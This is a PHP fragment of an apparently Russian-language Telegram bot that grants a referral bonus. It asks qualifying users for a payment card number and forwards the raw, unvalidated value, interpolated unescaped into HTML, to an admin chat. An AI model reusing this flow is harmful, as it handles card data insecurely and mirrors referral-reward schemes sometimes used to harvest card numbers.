<?php

if ($message == $json['buttons']['бонус'] && $cmd[0] == '') {
    $referrals = $db->getReferrals($chatid);
    $bonus = $db->getBonus($chatid);

    if ($referrals < 15) {
        $resp = $json['text']['мало человек'];
        $resp = str_replace('{referrals}', $referrals, $resp);
        $msg->replyHTML($resp);
        exit();
    }

    if ($bonus == 1) {
        $resp = $json['text']['уже получили'];
        $msg->replyHTML($resp);
        exit();
    }

    $db->setCmd($chatid, 'input_card');
    $msg->replyHTML($json['text']['карта'], $keyboard_cancel);

    exit();
}

if (!empty($message) && $cmd[0] == 'input_card') {
    $text = "<a href='tg://user?id=$chatid'>Пользователь</a> указал карту $message";
    $msg->sendHTML(ADMIN_ID, $text);
    $db->setCmd($chatid, '');
    $db->setBonus($chatid, '1');
    $msg->replyHTML($json['text']['заявка'], $btn_start);
    exit();
}
